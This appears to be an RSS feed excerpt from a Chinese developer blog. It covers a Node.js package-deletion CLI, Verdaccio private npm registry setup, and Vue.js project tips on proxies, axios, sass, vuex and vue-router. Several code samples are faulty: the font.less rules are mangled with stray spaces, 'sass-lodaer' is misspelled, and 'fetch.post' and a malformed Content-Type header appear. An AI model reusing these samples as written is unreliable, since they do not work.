  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>function</span> <span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>{</span>
    <span>// 先读文件夹</span>
    fs<span>.</span><span>stat</span><span>(</span>dir<span>,</span> <span>function</span> <span>(</span><span>_err<span>,</span> stat</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>stat<span>.</span><span>isDirectory</span><span>(</span><span>)</span><span>)</span> <span>{</span>
        fs<span>.</span><span>readdir</span><span>(</span>dir<span>,</span> <span>function</span> <span>(</span><span>_err<span>,</span> files</span><span>)</span> <span>{</span>
          files <span>=</span> files<span>.</span><span>map</span><span>(</span><span>(</span><span>file</span><span>)</span> <span>=></span> path<span>.</span><span>join</span><span>(</span>dir<span>,</span> file<span>)</span><span>)</span><span>;</span> <span>// a/b  a/m</span>
          files <span>=</span> files<span>.</span><span>map</span><span>(</span><span>(</span><span>file</span><span>)</span> <span>=></span> <span>removePromise</span><span>(</span>file<span>)</span><span>)</span><span>;</span> <span>// 这时候变成了promise</span>
          Promise<span>.</span><span>all</span><span>(</span>files<span>)</span><span>.</span><span>then</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
            fs<span>.</span><span>rmdir</span><span>(</span>dir<span>,</span> resolve<span>)</span><span>;</span>
          <span>}</span><span>)</span><span>;</span>
        <span>}</span><span>)</span><span>;</span>
      <span>}</span> <span>else</span> <span>{</span>
        fs<span>.</span><span>unlink</span><span>(</span>dir<span>,</span> resolve<span>)</span><span>;</span>
      <span>}</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
<span>}</span><span>;</span>

<span>const</span> <span>delPackage</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>delHandleInquirer</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>choices</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> <span>{</span> delPackageName<span>,</span> isDel <span>}</span> <span>=</span> choices<span>;</span>

    <span>if</span> <span>(</span>isDel<span>)</span> <span>{</span>
      <span>const</span> <span>PACKAGE_DIR</span> <span>=</span> <span><span>`</span><span><span>${</span><span>PACKAGES_DIR</span><span>}</span></span><span>/</span><span><span>${</span>delPackageName<span>}</span></span><span>`</span></span><span>;</span>
      <span>const</span> <span>SCSS_NAME</span> <span>=</span> <span><span>`</span><span><span>${</span><span>CSS_DIRECTORY</span><span>}</span></span><span>/</span><span><span>${</span>delPackageName<span>}</span></span><span>.scss</span><span>`</span></span><span>;</span>
      <span>const</span> <span>CSS_NAME</span> <span>=</span> <span><span>`</span><span><span>${</span><span>CSS_DIRECTORY</span><span>}</span></span><span>/</span><span><span>${</span>delPackageName<span>}</span></span><span>.css</span><span>`</span></span><span>;</span>
      <span>// const CSS_MIN_NAME = `${CSS_DIRECTORY}/${delPackageName}.min.css`</span>
      <span>const</span> <span>BASE_DOCS</span> <span>=</span> <span><span>`</span><span><span>${</span><span>DOCS_DIR</span><span>}</span></span><span>/base/</span><span><span>${</span><span>uppercamelcase</span><span>(</span>delPackageName<span>)</span><span>}</span></span><span>.md</span><span>`</span></span><span>;</span>
      <span>const</span> <span>BUSINESS_DOCS</span> <span>=</span> <span><span>`</span><span><span>${</span><span>DOCS_DIR</span><span>}</span></span><span>/business/</span><span><span>${</span><span>uppercamelcase</span><span>(</span>
        delPackageName
      <span>)</span><span>}</span></span><span>.md</span><span>`</span></span><span>;</span>
      <span>removePromise</span><span>(</span><span>PACKAGE_DIR</span><span>)</span><span>;</span>
      console<span>.</span><span>log</span><span>(</span>
        chalk<span>.</span><span>green</span><span>(</span>
          <span><span>`</span><span>The package directory </span><span><span>${</span><span>PACKAGES_DIR</span><span>}</span></span><span>/</span><span><span>${</span>delPackageName<span>}</span></span><span> was deleted successfully.</span><span>`</span></span>
        <span>)</span>
      <span>)</span><span>;</span>

      <span>const</span> delFiles <span>=</span> <span>[</span>
        <span>SCSS_NAME</span><span>,</span>
        <span>CSS_NAME</span><span>,</span>
        <span>// CSS_MIN_NAME,</span>
        <span>BASE_DOCS</span><span>,</span>
        <span>BUSINESS_DOCS</span><span>,</span>
      <span>]</span><span>;</span>
      delFiles<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span>{</span>
        fs<span>.</span><span>unlink</span><span>(</span>item<span>,</span> <span>(</span><span>err</span><span>)</span> <span>=></span> <span>{</span>
          <span>if</span> <span>(</span><span>!</span>err<span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>green</span><span>(</span><span><span>`</span><span>Delete file </span><span><span>${</span>item<span>}</span></span><span> successfully.</span><span>`</span></span><span>)</span><span>)</span><span>;</span>
          <span>}</span>
        <span>}</span><span>)</span><span>;</span>
      <span>}</span><span>)</span><span>;</span>
      <span>copyFile</span><span>(</span>
        path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>"/tmp"</span><span>)</span><span>,</span>
        <span>PACKAGES_DIR</span><span>,</span>
        <span>"export.js.tmp"</span><span>,</span>
        <span>"index.js"</span><span>,</span>
        choices
      <span>)</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>gray</span><span>(</span><span>"已经为你取消当前的删除操作."</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
  <span>}</span><span>)</span><span>;</span>
<span>}</span><span>;</span>

module<span>.</span>exports <span>=</span> delPackage<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="开启私有代理" tabindex="-1"> 开启私有代理</h2>
<h3 id="windows-服务器" tabindex="-1"> Windows 服务器</h3>
<ul>
<li><code>BAT_SCRIPT</code> 启动代理或者终止代理的脚本</li>
</ul>
<p><code>forever-npm-start.bat</code></p>
<div><pre><code>@echo off
C:
cd C:\Users\Administrator\AppData\Roaming\npm\node_modules\verdaccio\build\lib
forever start cli.js
exit
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p><code>forever-npm-stop.bat</code></p>
<div><pre><code>@echo off
C:
cd C:\Users\Administrator\AppData\Roaming\npm\node_modules\verdaccio\build\lib
forever stop cli.js
exit
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><ul>
<li>安装相关的依赖</li>
</ul>
<div><pre><code><span>npm</span>  <span>install</span>  -g  forever  verdaccio
</code></pre><div aria-hidden="true"><div></div></div></div><ul>
<li>修改监听的端口号, 必须修改否则外网将访问不到（参考文件目录 C:\Users\Administrator\AppData\Roaming\verdaccio\config.yml）, 添加一行配置 <code>listen: 0.0.0.0:4873</code></li>
<li>拷贝项目中的 BAT_SCRIPT 文件夹到 windows 服务器上的任何一个地方</li>
</ul>
<div><p>注意</p>
<ul>
<li>双击运行文件夹中的 forever-npm-start.bat 即可开启 npm 代理服务</li>
<li>双击运行文件夹中的 forever-npm-stop.bat 即可关闭 npm 代理服务</li>
<li>需要终止服务的话, 必须运行 forever-npm-stop.bat 否则在不重启机子下永远也关不掉该服务</li>
</ul>
</div>
<h3 id="有-docker-环境的服务器" tabindex="-1"> 有 Docker 环境的服务器</h3>
<p><code>DOCKER</code> 中的 <code>docker-compose.yml</code></p>
<div><pre><code><span>version</span><span>:</span> <span>"3"</span>

<span>services</span><span>:</span>
  <span>verdaccio</span><span>:</span>
    <span>image</span><span>:</span> verdaccio/verdaccio
    <span>restart</span><span>:</span> always
    <span>container_name</span><span>:</span> verdaccio
    <span>ports</span><span>:</span>
      <span>-</span> <span>"4873:4873"</span>

    <span>volumes</span><span>:</span>
      <span>-</span> ./verdaccio<span>-</span>storage<span>:</span>/verdaccio/storage

<span>volumes</span><span>:</span>
  <span>verdaccio</span><span>:</span>
    <span>driver</span><span>:</span> local
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><ul>
<li>拷贝项目中的 DOCKER 文件夹到有 Docker 环境的服务器的任何一个地方</li>
<li>切换至 DOCKER 目录</li>
<li>使用 docker-compose 开启服务</li>
</ul>
<div><pre><code><span>docker-compose</span>  up  -d
</code></pre><div aria-hidden="true"><div></div></div></div><ul>
<li>使用 docker-compose 开启服务</li>
</ul>
<div><pre><code><span>docker-compose</span>  stop
</code></pre><div aria-hidden="true"><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Vue.js 填坑笔记</title>
      <link>https://vxhly.github.io/views/vuejs/fill-the-pit-with-vuejs.html</link>
      <guid>https://vxhly.github.io/views/vuejs/fill-the-pit-with-vuejs.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Vue.js 填坑笔记</source>
      <description>前言
记录一些使用 vue-cli 脚手架创建项目时, 遇到的一些问题以及解决方案。

</description>
      <category>vuejs</category>
      <pubDate>Mon, 11 Sep 2017 16:55:20 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>记录一些使用 vue-cli 脚手架创建项目时, 遇到的一些问题以及解决方案。</p>
</div>

<h2 id="vue-1-x-升级到-vue-2-x" tabindex="-1"> vue 1.x 升级到 vue 2.x</h2>
<p>首先需要安装 <code>vue-migration-helper</code> CLI 工具:</p>
<p>控制台运行命令: <code>npm install --global vue-migration-helper</code> CLI 工具来帮助项目从 Vue 1.x 迁移到 2.x。 它扫描文件以查找特定于 Vue 的代码, 并对需要升级的代码提供详细的警告。 vue-migration-helper 的介绍说明告诉我们它大概能捕获 80% 的升级帮助信息, 而不是全部。所以终端输出的帮助信息并不是完全正确的, 在升级时不要盲目 copy &amp; paste , 还是要根据实际情况去改写。</p>
<p>进入当前的项目: 运行: <code>vue-migration-helper</code></p>
<p>具体升级指南, 请参照<a href="https://cn.vuejs.org/v2/guide/migration.html" target="_blank" rel="noopener noreferrer">官方文档-从 Vue 1.x 迁移</a></p>
<h2 id="给与-windows-用户的一条强烈建议" tabindex="-1"> 给与 Windows 用户的一条强烈建议</h2>
<p>Windows 在执行 <code>npm install</code> 期间遇到关于 <code>node-gyp</code> 的错误, 那么你很有可能没有在你的系统上安装正确的构建工具。构建工具包括 <code>Python</code> 和 <code>Visual Studio</code> 等等。</p>
<p>使用 <a href="https://github.com/felixrieseberg/windows-build-tools" target="_blank" rel="noopener noreferrer">windows-build-tools</a> 来为我们完成大部分烦人的工作。全局安装此工具将依次设置 Visual C++ 软件包、Python 等等</p>
<div><pre><code><span>npm</span> <span>install</span> --global --production windows-build-tools
</code></pre><div aria-hidden="true"><div></div></div></div><p>执行上条命令时注意以管理员权限开启一个 PowerShell 来执行该条命令, 因为自动化工具会自动的添加一些 PATH 变量</p>
<p>如果是 Windows 7 系统, 还需要安装 <a href="http://www.microsoft.com/en-us/download/details.aspx?id=40773" target="_blank" rel="noopener noreferrer">. NET Framework 4.5.1</a></p>
<p>还有一些更加恶心的报错信息通常是因为墙的原因, 这里建议安装 <code>nrm</code> 来随时切换软件源</p>
<div><pre><code><span>npm</span> -g nrm
nrm use taobao
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>以下这几种软件源可供选择, 默认使用 npm 官方软件源</p>
<div><pre><code>
* <span>npm</span> ---- https://registry.npmjs.org/

  cnpm --- http://r.cnpmjs.org/
  taobao - https://registry.npm.taobao.org/
  nj ----- https://registry.nodejitsu.com/
  rednpm - http://registry.mirror.cqupt.edu.cn/
  npmMirror  https://skimdb.npmjs.com/registry/
  edunpm - http://registry.enpmjs.org/
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="设置代理与跨域" tabindex="-1"> 设置代理与跨域</h2>
<h3 id="开发时设置" tabindex="-1"> 开发时设置</h3>
<p>如果你的后端 API 服务是 Express 提供或者是 Thinkjs 再或者是 koa2 等等, 当你请求数据时就会面临着跨域请求问题</p>
<p>执行 <code>npm run dev</code> , 你会发现会报一个错误: <code>vue-resource.common.js?e289:1071 POST http://localhost:8080/api/use... 404 (Not Found)</code> 。这是由于直接访问 <code>8080</code> 端口, 是访问不到的, 所以这里需要设置一下代理转发映射.</p>
<p>项目根目录下的 config 文件夹中有一个 proxyTable 参数, 用来设置地址映射表, 可以添加到开发时配置（dev）中</p>
<div><pre><code><span>|</span>-- config
  <span>|</span>-- dev.env.js
  <span>|</span>-- index.js
  <span>|</span>-- prod.env.js
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h4 id="config-index-js" tabindex="-1"> config/index.js</h4>
<div><pre><code><span>dev</span><span>:</span> <span>{</span>
    <span>// ...</span>
    <span>proxyTable</span><span>:</span> <span>{</span>
        <span>'/api'</span><span>:</span> <span>{</span>
            <span>target</span><span>:</span> <span>'http://127.0.0.1:3000/api/'</span><span>,</span>
            <span>changeOrigin</span><span>:</span> <span>true</span><span>,</span>
            <span>pathRewrite</span><span>:</span> <span>{</span>
                <span>'^/api'</span><span>:</span> <span>''</span>
            <span>}</span>
        <span>}</span>
    <span>}</span><span>,</span>
    <span>// ...</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>添加以上代码之后, 请求 <code>/api</code> 时就代表 <code>http://127.0.0.1:3000/api/</code> (这里要写 ip, 不要写 localhost), changeOrigin 参数接收一个布尔值, 如果为 true, 这样就不会有跨域问题了。</p>
<p>更多接口参数配置, 请参考 <a href="https://github.com/chimurai/http-proxy-middleware#options" target="_blank" rel="noopener noreferrer">https://github.com/chimurai/http-proxy-middleware#options</a></p>
<p>webpack 接口配置文档 <a href="https://webpack.js.org/configuration/dev-server/#devserver-proxy" target="_blank" rel="noopener noreferrer">https://webpack.js.org/configuration/dev-server/#devserver-proxy</a></p>
<h3 id="正式上线时设置" tabindex="-1"> 正式上线时设置</h3>
<div><pre><code><span>|</span>-- src
  <span>|</span>-- axios
    <span>|</span>-- index.js
  <span>|</span>-- config.js
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>正式上线时, 不推荐使用上一个方案, 这里推荐使用 axios 进行转发</p>
<h4 id="src-config-js" tabindex="-1"> src/config.js</h4>
<div><pre><code><span>export</span> <span>default</span> <span>{</span>
  <span>serverUrl</span><span>:</span> <span>"http://127.0.0.1:3000/"</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h4 id="src-axios-index-js" tabindex="-1"> src/axios/index.js</h4>
<div><pre><code><span>import</span> axios <span>from</span> <span>"axios"</span><span>;</span>
<span>import</span> config <span>from</span> <span>"@/config"</span><span>;</span>

<span>// 设置全局 axio s默认值</span>
axios<span>.</span>defaults<span>.</span>baseURL <span>=</span> config<span>.</span>serverUrl<span>;</span>
axios<span>.</span>defaults<span>.</span>timeout <span>=</span> <span>5000</span><span>;</span> <span>// 5000的超时验证</span>
axios<span>.</span>defaults<span>.</span>headers<span>.</span>post<span>[</span><span>"Content-Type"</span><span>]</span> <span>=</span> <span>"application/jsoncharset=UTF-8"</span><span>;</span>

<span>// 创建一个 axios 实例</span>
<span>const</span> instance <span>=</span> axios<span>.</span><span>create</span><span>(</span><span>)</span><span>;</span>
instance<span>.</span>defaults<span>.</span>headers<span>.</span>post<span>[</span><span>"Content-Type"</span><span>]</span> <span>=</span>
  <span>"application/jsoncharset=UTF-8"</span><span>;</span>

axios<span>.</span>interceptors<span>.</span>request<span>.</span>use <span>=</span> instance<span>.</span>interceptors<span>.</span>request<span>.</span>use<span>;</span>

<span>export</span> <span>async</span> <span>function</span> <span>postDate</span><span>(</span><span>username<span>,</span> password</span><span>)</span> <span>{</span>
  <span>try</span> <span>{</span>
    <span>const</span> response <span>=</span> <span>await</span> fetch<span>.</span><span>post</span><span>(</span><span>"/postDate"</span><span>,</span> <span>{</span>
      username<span>,</span>
      password<span>,</span>
    <span>}</span><span>)</span><span>;</span>
    <span>return</span> response<span>.</span>data<span>;</span>
  <span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>"message"</span><span>,</span> err<span>)</span><span>;</span>
    <span>if</span> <span>(</span>err<span>.</span>response<span>)</span> <span>{</span>
      <span>throw</span> <span>Error</span><span>(</span>err<span>.</span>response<span>.</span>data<span>.</span>message<span>)</span><span>;</span>
    <span>}</span>
    <span>throw</span> err<span>;</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="父子组件" tabindex="-1"> 父子组件</h2>
<div><pre><code><span>|</span>-- src
  <span>|</span>-- components
    <span>|</span>-- HerderBar.vue
    <span>|</span>-- FooterBar.vue
  <span>|</span>-- pages
    <span>|</span>-- Home.vue
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>假如你的 components 目录下有 HerderBar.vue 和 FooterBar.vue 这两个子组件, 而 Home.vue 要引用这两组件, 那么下面这种写法可以完成该需求</p>
<h3 id="src-pages-home-vue" tabindex="-1"> src/pages/Home.vue</h3>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>header-bar</span><span>></span></span><span><span><span>&lt;/</span>header-bar</span><span>></span></span>
    <span>&lt;!-- ... ... --></span>
    <span><span><span>&lt;</span>footer-bar</span><span>></span></span><span><span><span>&lt;/</span>footer-bar</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>import</span> HeaderBar <span>from</span> <span>"@/components/HeaderBar"</span><span>;</span>
  <span>import</span> FooterBar <span>from</span> <span>"@/components/FooterBar"</span><span>;</span>

  <span>export</span> <span>default</span> <span>{</span>
    <span>name</span><span>:</span> <span>"Home"</span><span>,</span>
    <span>components</span><span>:</span> <span>{</span>
      HeaderBar<span>,</span>
      FooterBar<span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="图标库" tabindex="-1"> 图标库</h2>
<p>市面上用的比较广泛的图标库有两个, 一是<a href="http://iconfont.cn/" target="_blank" rel="noopener noreferrer">阿里巴巴矢量图标库</a>, 其有上百万图标共程序员选择, 自定义比较强；二是<a href="http://fontawesome.io/" target="_blank" rel="noopener noreferrer">Font Awesome</a>, 该图标库虽没有上百万图标, 但也受到大部门程序员喜爱。</p>
<p>很多人在写 Vue 项目时, 前端 UI 框架都喜欢使用 Element UI, 但是该 UI 框架默认提供的图标库实现是少之又少, 但是该 UI 框架允许我们引入第三方图标库</p>
<h3 id="iconfont" tabindex="-1"> iconfont</h3>
<p>这个引入就非常简单了, 在 iconfont 网站上有提供离线版和在线版, 看自己的意愿, 然后在 index.html 里使用 style 标签引入即可。</p>
<h3 id="fontawesome" tabindex="-1"> fontawesome</h3>
<p>参考代码<a href="https://github.com/ElementUI/element-font-awesome" target="_blank" rel="noopener noreferrer">element-font-awesome</a></p>
<p>使用 less 时, 别忘了安装 npm 依赖</p>
<div><pre><code><span>npm</span> <span>install</span> -S <span>less</span> less-loader
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="目录结构" tabindex="-1"> 目录结构</h4>
<div><pre><code><span>|</span>-- src
  <span>|</span>-- font.less
  <span>|</span>-- main.js
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h4 id="src-main-js" tabindex="-1"> src/main.js</h4>
<div><pre><code><span>import</span> <span>"./font.less"</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="src-font-less" tabindex="-1"> src/font.less</h4>
<div><pre><code><span>[</span><span>class</span> <span>^=</span> <span>"el-icon-fa"</span><span>]</span><span>,</span> <span>[</span><span>class</span> <span>*=</span> <span>" el-icon-fa"</span><span>]</span> <span>{</span>
    <span>display</span><span>:</span> inline <span>-</span> block<span>;</span>
    <span>font</span><span>:</span> normal normal normal <span>14</span> px <span>/</span> <span>1</span> FontAwesome<span>!</span>important<span>;</span>
    font <span>-</span> size<span>:</span> inherit<span>;</span>
    text <span>-</span> rendering<span>:</span> auto<span>;</span> <span>-</span>
    webkit <span>-</span> font <span>-</span> smoothing<span>:</span> antialiased<span>;</span> <span>-</span>
    moz <span>-</span> osx <span>-</span> font <span>-</span> smoothing<span>:</span> grayscale<span>;</span>
<span>}</span><span>;</span>

@<span>import</span> <span>url</span><span>(</span><span>"../node_modules/font-awesome/less/font-awesome"</span><span>)</span><span>;</span>
@fa <span>-</span> css <span>-</span> prefix<span>:</span> el <span>-</span> icon <span>-</span> fa<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="sass" tabindex="-1"> sass</h2>
<p>对于 css 的预编译器, 个人比较喜欢 sass 的, 在使用 sass 时仍然需要添加 npm 依赖</p>
<div><pre><code><span>npm</span> <span>install</span> --save node-sass sass-lodaer
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="目录结构-1" tabindex="-1"> 目录结构</h3>
<div><pre><code><span>|</span>-- src
  <span>|</span>-- assets
    <span>|</span>-- scss
      <span>|</span>-- _public.scss
      <span>|</span>-- index.scss
  <span>|</span>-- App.vue
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="src-app-vue" tabindex="-1"> src/App.vue</h4>
<div><pre><code><span><span><span>&lt;</span>style</span> <span>lang</span><span><span>=</span><span>"</span>scss<span>"</span></span><span>></span></span><span><span>
  <span><span>@import</span> <span>"./assets/scss/index"</span><span>;</span></span>
</span></span><span><span><span>&lt;/</span>style</span><span>></span></span>

<span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>app<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>export</span> <span>default</span> <span>{</span>
    <span>name</span><span>:</span> <span>"app"</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="src-assets-scss-index-scss" tabindex="-1"> src/assets/scss/index.scss</h4>
<div><pre><code><span><span>@import</span> <span>"public"</span><span>;</span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="src-assets-scss-public-scss" tabindex="-1"> src/assets/scss/public.scss</h4>
<div><pre><code><span>#app</span> <span>{</span>
  <span>font-family</span><span>:</span> <span>"Helvetica Neue"</span><span>,</span> Helvetica<span>,</span> <span>"PingFang SC"</span><span>,</span> <span>"Hiragino Sans GB"</span><span>,</span>
    <span>"Microsoft YaHei"</span><span>,</span> <span>"微软雅黑"</span><span>,</span> Arial<span>,</span> sans-serif<span>;</span>
  <span>-webkit-font-smoothing</span><span>:</span> antialiased<span>;</span>
  <span>-moz-osx-font-smoothing</span><span>:</span> grayscale<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="vuex" tabindex="-1"> vuex</h2>
<h3 id="目录结构-2" tabindex="-1"> 目录结构</h3>
<div><pre><code><span>|</span>-- src
  <span>|</span>-- store
    <span>|</span>-- modules
      <span>|</span>-- <span>..</span>. <span>..</span>.
    <span>|</span>-- actions.js      <span># 根级别的 action =></span>
    <span>|</span>-- getters.js      <span># 根级别的 mutation =></span>
    <span>|</span>-- index.js        <span># 我们组装模块并导出 store 的地方</span>
    <span>|</span>-- types.js        <span># 根级别的 type => 状态</span>
  <span>|</span>-- main.js
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="src-main-js-1" tabindex="-1"> src/main.js</h4>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> App <span>from</span> <span>"./App"</span><span>;</span>

<span>import</span> store <span>from</span> <span>"./store"</span><span>;</span>

Vue<span>.</span>config<span>.</span>productionTip <span>=</span> <span>false</span><span>;</span>

<span>/* eslint-disable no-new */</span>
<span>new</span> <span>Vue</span><span>(</span><span>{</span>
  <span>el</span><span>:</span> <span>"#app"</span><span>,</span>
  store<span>,</span>
  <span>template</span><span>:</span> <span>"&lt;App/>"</span><span>,</span>
  <span>components</span><span>:</span> <span>{</span>
    App<span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="vue-router" tabindex="-1"> vue-router</h2>
<h3 id="目录结构-3" tabindex="-1"> 目录结构</h3>
<div><pre><code><span>|</span>-- router
  <span>|</span>-- axios
    <span>|</span>-- index.js
  <span>|</span>-- main.js
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h4 id="src-main-js-2" tabindex="-1"> src/main.js</h4>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> App <span>from</span> <span>"./App"</span><span>;</span>
<span>import</span> router <span>from</span> <span>"./router"</span><span>;</span>

Vue<span>.</span>config<span>.</span>productionTip <span>=</span> <span>false</span><span>;</span>

<span>/* eslint-disable no-new */</span>
<span>new</span> <span>Vue</span><span>(</span><span>{</span>
  <span>el</span><span>:</span> <span>"#app"</span><span>,</span>
  router<span>,</span>
  <span>template</span><span>:</span> <span>"&lt;App/>"</span><span>,</span>
  <span>components</span><span>:</span> <span>{</span>
    App<span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>如果遇上重复路由的时候, 可以使用以下方法进行封装</p>
</div>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> Router <span>from</span> <span>"vue-router"</span><span>;</span>

<span>// hack router push callback</span>
<span>const</span> originalPush <span>=</span> <span>Router</span><span>.</span>prototype<span>.</span>push<span>;</span>
<span>Router</span><span>.</span>prototype<span>.</span><span>push</span> <span>=</span> <span>function</span> <span>push</span><span>(</span><span>location<span>,</span> onResolve<span>,</span> onReject</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>onResolve <span>||</span> onReject<span>)</span>
    <span>return</span> <span>originalPush</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> location<span>,</span> onResolve<span>,</span> onReject<span>)</span><span>;</span>
  <span>return</span> <span>originalPush</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> location<span>)</span><span>.</span><span>catch</span><span>(</span><span>(</span><span>err</span><span>)</span> <span>=></span> err<span>)</span><span>;</span>
<span>}</span><span>;</span>

<span>const</span> constantRouterMap <span>=</span> <span>[</span><span>{</span><span>}</span><span>]</span><span>;</span>

Vue<span>.</span><span>use</span><span>(</span>Router<span>)</span><span>;</span>

<span>const</span> router <span>=</span> <span>new</span> <span>Router</span><span>(</span><span>{</span>
  <span>mode</span><span>:</span> <span>"history"</span><span>,</span>
  <span>routes</span><span>:</span> constantRouterMap<span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>// 重写addRoutes方法, 解决重复添加路由问题</span>
router<span>.</span><span>$addRoutes</span> <span>=</span> <span>(</span><span>params</span><span>)</span> <span>=></span> <span>{</span>
  router<span>.</span>matcher <span>=</span> <span>new</span> <span>Router</span><span>(</span><span>{</span>
    <span>mode</span><span>:</span> <span>"history"</span><span>,</span>
    <span>routes</span><span>:</span> constantRouterMap<span>,</span>
  <span>}</span><span>)</span><span>.</span>matcher<span>;</span>
  router<span>.</span><span>addRoutes</span><span>(</span>params<span>)</span><span>;</span>
<span>}</span><span>;</span>

<span>export</span> <span>default</span> router<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="html5-history-模式" tabindex="-1"> HTML5 History 模式</h3>
